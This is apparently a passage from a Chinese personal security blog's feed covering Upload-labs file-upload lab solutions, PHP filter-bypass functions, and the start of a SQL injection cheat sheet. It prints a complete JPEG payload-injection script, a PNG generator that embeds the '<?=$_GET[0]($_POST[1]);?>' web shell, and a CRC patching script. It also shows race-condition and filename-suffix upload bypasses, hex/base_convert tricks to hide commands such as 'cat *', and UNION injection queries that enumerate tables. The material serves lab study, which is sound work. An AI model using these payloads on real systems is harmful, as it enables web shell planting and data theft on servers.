class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$img = imagecreatetruecolor(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($y = <span class="number">0</span>; $y &lt; sizeof($p); $y += <span class="number">3</span>) &#123;</span><br><span class="line">   $r = $p[$y];</span><br><span class="line">   $g = $p[$y+<span class="number">1</span>];</span><br><span class="line">   $b = $p[$y+<span class="number">2</span>];</span><br><span class="line">   $color = imagecolorallocate($img, $r, $g, $b);</span><br><span class="line">   imagesetpixel($img, round($y / <span class="number">3</span>), <span class="number">0</span>, $color);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">imagepng($img,<span class="string">'./1.png'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>但我TM竟然不知道<code>&lt;?=$_GET[0]($_POST[1]);?&gt;</code>这个怎么利用？？？！！！</p><img src="D:\Blog\source\_posts\Upload-labs靶场.assets\image-20200209181641002.png" alt="image-20200209181641002" style="zoom:80%;" /><p>制作好png上传后下载下来成功镶入了那句话，但我还是不知道怎么用。。。算了先放这里</p><h5 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h5><p>在PLTE数据块后加入一句话</p><img src="D:\Blog\source\_posts\Upload-labs靶场.assets\image-20200209201526629.png" alt="image-20200209201526629" style="zoom:67%;" /><p>计算PLTE数据块的CRC<br>CRC脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">png = open(<span class="string">r'2.png'</span>,<span class="string">'rb'</span>)</span><br><span class="line">a = png.read()</span><br><span class="line">png.close()</span><br><span class="line">hexstr = binascii.b2a_hex(a)</span><br><span class="line"></span><br><span class="line"><span class="string">''' PLTE crc '''</span></span><br><span class="line">data =  <span class="string">'504c5445'</span>+ re.findall(<span class="string">'504c5445(.*?)49444154'</span>,hexstr)[<span class="number">0</span>]</span><br><span class="line">crc = binascii.crc32(data[:<span class="number">-16</span>].decode(<span class="string">'hex'</span>)) &amp; <span class="number">0xffffffff</span></span><br><span class="line"><span class="keyword">print</span> hex(crc)</span><br></pre></td></tr></table></figure><p>运算结果：526579b0</p><p>修改CRC值</p><img src="D:\Blog\source\_posts\Upload-labs靶场.assets\image-20200209201005832.png" alt="image-20200209201005832" style="zoom:67%;" /><p>将这个图片上传就传上一句话了（反正我是没搞出来）。。。<a href="https://github.com/Yang1k/upload-labs-Pass16" target="_blank" rel="noopener">原文中素材链接</a></p><h4 id="JPG"><a href="#JPG" class="headerlink" title="JPG"></a>JPG</h4><img src="D:\Blog\source\_posts\Upload-labs靶场.assets\image-20200209202017284.png" alt="image-20200209202017284" style="zoom:67%;" /><p>首先准备一张.jpg后缀的文件，上传上去然后将二次渲染后的图片下载下来命名为1.jpg</p><p>然后上国外大佬脚本，并且命名为<code>jpg_payload.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span></span><br><span class="line"><span class="comment">    It is necessary that the size and quality of the initial image are the same as those of the processed image.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    1) Upload an arbitrary image via secured files upload script</span></span><br><span class="line"><span class="comment">    2) Save the processed image and launch:</span></span><br><span class="line"><span class="comment">    jpg_payload.php &lt;jpg_name.jpg&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    In case of successful injection you will get a specially crafted image, which should be uploaded again.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Since the most straightforward injection method is used, the following problems can occur:</span></span><br><span class="line"><span class="comment">    1) After the second processing the injected data may become partially corrupted.</span></span><br><span class="line"><span class="comment">    2) The jpg_payload.php script outputs "Something's wrong".</span></span><br><span class="line"><span class="comment">    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Sergey Bobrov <span class="doctag">@Black</span>2Fan.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    See also:</span></span><br><span class="line"><span class="comment">    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    $miniPayload = <span class="string">"&lt;?=phpinfo();?&gt;"</span>; <span class="comment">/*这里插入想插入的一句话代码*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!extension_loaded(<span class="string">'gd'</span>) || !function_exists(<span class="string">'imagecreatefromjpeg'</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'php-gd is not installed'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($argv[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'php jpg_payload.php &lt;jpg_name.jpg&gt;'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    set_error_handler(<span class="string">"custom_error_handler"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>($pad = <span class="number">0</span>; $pad &lt; <span class="number">1024</span>; $pad++) &#123;</span><br><span class="line">        $nullbytePayloadSize = $pad;</span><br><span class="line">        $dis = <span class="keyword">new</span> DataInputStream($argv[<span class="number">1</span>]);</span><br><span class="line">        $outStream = file_get_contents($argv[<span class="number">1</span>]);</span><br><span class="line">        $extraBytes = <span class="number">0</span>;</span><br><span class="line">        $correctImage = <span class="keyword">TRUE</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($dis-&gt;readShort() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Incorrect SOI marker'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">            $marker = $dis-&gt;readByte();</span><br><span class="line">            $size = $dis-&gt;readShort() - <span class="number">2</span>;</span><br><span class="line">            $dis-&gt;skip($size);</span><br><span class="line">            <span class="keyword">if</span>($marker === <span class="number">0xDA</span>) &#123;</span><br><span class="line">                $startPos = $dis-&gt;seek();</span><br><span class="line">                $outStreamTmp = </span><br><span class="line">                    substr($outStream, <span class="number">0</span>, $startPos) . </span><br><span class="line">                    $miniPayload . </span><br><span class="line">                    str_repeat(<span class="string">"\0"</span>,$nullbytePayloadSize) . </span><br><span class="line">                    substr($outStream, $startPos);</span><br><span class="line">                checkImage(<span class="string">'_'</span>.$argv[<span class="number">1</span>], $outStreamTmp, <span class="keyword">TRUE</span>);</span><br><span class="line">                <span class="keyword">if</span>($extraBytes !== <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">while</span>((!$dis-&gt;eof())) &#123;</span><br><span class="line">                        <span class="keyword">if</span>($dis-&gt;readByte() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span>($dis-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    $stopPos = $dis-&gt;seek() - <span class="number">2</span>;</span><br><span class="line">                    $imageStreamSize = $stopPos - $startPos;</span><br><span class="line">                    $outStream = </span><br><span class="line">                        substr($outStream, <span class="number">0</span>, $startPos) . </span><br><span class="line">                        $miniPayload . </span><br><span class="line">                        substr(</span><br><span class="line">                            str_repeat(<span class="string">"\0"</span>,$nullbytePayloadSize).</span><br><span class="line">                                substr($outStream, $startPos, $imageStreamSize),</span><br><span class="line">                            <span class="number">0</span>,</span><br><span class="line">                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . </span><br><span class="line">                                substr($outStream, $stopPos);</span><br><span class="line">                &#125; <span class="keyword">elseif</span>($correctImage) &#123;</span><br><span class="line">                    $outStream = $outStreamTmp;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(checkImage(<span class="string">'payload_'</span>.$argv[<span class="number">1</span>], $outStream)) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">'Success!'</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    unlink(<span class="string">'payload_'</span>.$argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Something\'s wrong'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span><span class="params">($filename, $data, $unlink = FALSE)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $correctImage;</span><br><span class="line">        file_put_contents($filename, $data);</span><br><span class="line">        $correctImage = <span class="keyword">TRUE</span>;</span><br><span class="line">        imagecreatefromjpeg($filename);</span><br><span class="line">        <span class="keyword">if</span>($unlink)</span><br><span class="line">            unlink($filename);</span><br><span class="line">        <span class="keyword">return</span> $correctImage;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span><span class="params">($errno, $errstr, $errfile, $errline)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $extraBytes, $correctImage;</span><br><span class="line">        $correctImage = <span class="keyword">FALSE</span>;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/(\d+) extraneous bytes before marker/'</span>, $errstr, $m)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($m[<span class="number">1</span>])) &#123;</span><br><span class="line">                $extraBytes = (int)$m[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $binData;</span><br><span class="line">        <span class="keyword">private</span> $order;</span><br><span class="line">        <span class="keyword">private</span> $size;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename, $order = false, $fromString = false)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = <span class="string">''</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;order = $order;</span><br><span class="line">            <span class="keyword">if</span>(!$fromString) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!file_exists($filename) || !is_file($filename))</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">'File not exists ['</span>.$filename.<span class="string">']'</span>);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;binData = file_get_contents($filename);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;binData = $filename;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;size = strlen(<span class="keyword">$this</span>-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">$this</span>-&gt;size - strlen(<span class="keyword">$this</span>-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span><span class="params">($skip)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, $skip);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;eof()) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">'End Of File'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $byte = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> ord($byte);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen(<span class="keyword">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">'End Of File'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $short = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;order) &#123;</span><br><span class="line">                $short = (ord($short[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + ord($short[<span class="number">0</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $short = (ord($short[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + ord($short[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> $short;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> !<span class="keyword">$this</span>-&gt;binData||(strlen(<span class="keyword">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后执行命令<code>php jpg_payload.php 1.jpg</code></p><p>显示<code>Success!</code>即成功，装换后的文件名为<code>payload_1.jpg</code></p><p>将<code>payload_1.jpg</code>上传，php代码成功被解析</p><h3 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h3><p>条件竞争，利用burp的intruder模块，不停的发送数据包，就可以连接上，我硬是开了3个intruder模块才访问的到网页</p><img src="D:\Blog\source\_posts\Upload-labs靶场.assets\image-20200209204615811.png" alt="image-20200209204615811" style="zoom:67%;" /><img src="D:\Blog\source\_posts\Upload-labs靶场.assets\image-20200209211644172.png" alt="image-20200209211644172" style="zoom:67%;" /><h3 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass-18"></a>Pass-18</h3><p>同样条件竞争，让发包的速度快过函数rename()的速度即可成功上传</p><img src="D:\Blog\source\_posts\Upload-labs靶场.assets\image-20200209212552816.png" alt="image-20200209212552816" style="zoom:67%;" /><h3 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass-19"></a>Pass-19</h3><p>保存名称那里在后缀，名加上一个<code>/.</code> 、<code>.(空格)</code>或<code>.</code>；<code>move_uploaded_file()</code>还有一个特性，会忽略掉文件末尾的<code>.</code></p><img src="D:\Blog\source\_posts\Upload-labs靶场.assets\image-20200209213807846.png" alt="image-20200209213807846" style="zoom:80%;" />]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> uploads </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一些PHP函数</title>
      <link href="/2020/02/06/%E4%B8%80%E4%BA%9BPHP%E5%87%BD%E6%95%B0/"/>
      <url>/2020/02/06/%E4%B8%80%E4%BA%9BPHP%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="绕过函数"><a href="#绕过函数" class="headerlink" title="绕过函数"></a>绕过函数</h2><h3 id="base-convert"><a href="#base-convert" class="headerlink" title="base_convert"></a>base_convert</h3><img src="https://i.loli.net/2020/03/27/RBMCmtWu8n7aVDP.png" alt="image-20200206145300281" style="zoom:67%;" /><p>可用以绕过执行一些系统命令</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base_convert(<span class="string">'phpinfo'</span>,<span class="number">36</span>,<span class="number">10</span>) ==&gt; <span class="number">55490343972</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base_convert(<span class="number">55490343972</span>,<span class="number">10</span>,<span class="number">36</span>)() ==&gt; phpinfo()</span><br></pre></td></tr></table></figure><h3 id="hex2bin"><a href="#hex2bin" class="headerlink" title="hex2bin"></a>hex2bin</h3><img src="https://i.loli.net/2020/03/27/pfYWOVitNbF25MH.png" alt="image-20200206150504686" style="zoom:67%;" /><h3 id="dechex"><a href="#dechex" class="headerlink" title="dechex"></a>dechex</h3><img src="https://i.loli.net/2020/03/27/oyvUnakI3XiOEub.png" alt="image-20200206150752364" style="zoom:67%;" /><h3 id="hexdec"><a href="#hexdec" class="headerlink" title="hexdec"></a>hexdec</h3><img src="https://i.loli.net/2020/03/27/2uOBqQAYFJiyLfG.png" alt="image-20200206151951567" style="zoom:67%;" /><p>例：cat *的16进制为636174202a</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexdec(<span class="number">636174202</span>a) ==&gt; <span class="number">426836762666</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hex2bin(dechex(<span class="number">426836762666</span>)) ==&gt; cat *</span><br></pre></td></tr></table></figure><h2 id="读取数据函数"><a href="#读取数据函数" class="headerlink" title="读取数据函数"></a>读取数据函数</h2><h3 id="scandir"><a href="#scandir" class="headerlink" title="scandir"></a>scandir</h3><img src="https://i.loli.net/2020/03/27/D1RloOZgGHmMIAt.png" alt="image-20200206153405574" style="zoom:67%;" /><h3 id="readfile"><a href="#readfile" class="headerlink" title="readfile"></a>readfile</h3><img src="https://i.loli.net/2020/03/27/rTM2RcGiJfANCFu.png" alt="image-20200206153545427" style="zoom:67%;" /><h3 id="chr"><a href="#chr" class="headerlink" title="chr"></a>chr</h3><img src="https://i.loli.net/2020/03/27/GJWmsoi4l6t17d2.png" alt="image-20200206154027139" style="zoom:67%;" /><h3 id="var-dump"><a href="#var-dump" class="headerlink" title="var_dump"></a>var_dump</h3><img src="https://i.loli.net/2020/03/27/ZdOUJxWX3SsTvI5.png" alt="image-20200206154243939" style="zoom:67%;" /><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(scandir(chr(<span class="number">47</span>)))    读取当前目录文件</span><br></pre></td></tr></table></figure><h3 id="show-source"><a href="#show-source" class="headerlink" title="show_source"></a>show_source</h3><p><img src="https://i.loli.net/2020/03/27/uSI58Pgh49dVHWm.png" alt="image-20200315185811823"></p><p>可现显示php代码，用于<code>data://</code>协议中来读取代码</p><h2 id="漏洞函数"><a href="#漏洞函数" class="headerlink" title="漏洞函数"></a>漏洞函数</h2><h3 id="strcmp"><a href="#strcmp" class="headerlink" title="strcmp"></a>strcmp</h3><p><code>int strcmp(string $str1, string $str2)</code></p><p><code>str1</code>为第一个字符串，<code>str2</code>为第二个字符串，如果<code>str1</code>小于<code>str2</code>返回<code>&lt;0</code>如果<code>str1</code>大于<code>str2</code>返回<code>&gt;0</code>；如果二者相等，返回<code>0</code></p><p>但是当我们传入数组的时候，函数接收到不合法的字符后会报错，但是在php5.3之前的php中，显示了报错的警告信息后将<code>return 0</code>；意思是就算报了错，但判定结果还是相等的，即可通过数组进行绕过</p><h3 id="is-numeric"><a href="#is-numeric" class="headerlink" title="is_numeric"></a>is_numeric</h3><p>函数检测变量是否为数字或数字字符串，是则返回<code>true</code>，否则返回<code>false</code>，但是该函数对于空字符（如：<code>%00</code>，<code>%20</code>）则会直接跳过空字符判断，执行后面的语句，是判断则会接着继续后面的判断，注：<code>%20</code>放在字符串首则无效，例：</p><p><img src="https://i.loli.net/2020/03/27/JePYo7bWKfl3MNn.png" alt="image-20200229210728123"></p>]]></content>
      
      
      <categories>
          
          <category> 备忘录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入总结（个人向）</title>
      <link href="/2020/02/03/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%AA%E4%BA%BA%E5%90%91%EF%BC%89/"/>
      <url>/2020/02/03/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%AA%E4%BA%BA%E5%90%91%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>俗话说，好记性不如烂笔头，故做点总结，后续慢慢补</p><p>以下查询均以MYSQL数据库为例</p><p>有以下数据库</p><p><img src="https://i.loli.net/2020/03/27/XRZrQJCejl4dgwP.png" alt="image-20200203150030600"></p><h1 id="注入方法"><a href="#注入方法" class="headerlink" title="注入方法"></a>注入方法</h1><h2 id="Union查询注入"><a href="#Union查询注入" class="headerlink" title="Union查询注入"></a>Union查询注入</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">where</span> <span class="keyword">id</span> = <span class="string">'1'</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>;</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">where</span> <span class="keyword">id</span> = <span class="string">'1'</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">database</span>(),<span class="number">3</span>;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/27/KaESgHtQqzL6AT7.png" alt="image-20200203152550631"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">where</span> <span class="keyword">id</span> = <span class="string">'1'</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema = <span class="keyword">database</span>()),<span class="number">3</span>;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/27/g56rFxJh73ZDscT.png" alt="image-20200203153110823"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">where</span> <span class="keyword">id</span> = <span class="string">'1'</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name = <span class="string">'test'</span>),<span class="number">3</span>;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/27/KieYnBW23zmrf7L.png" 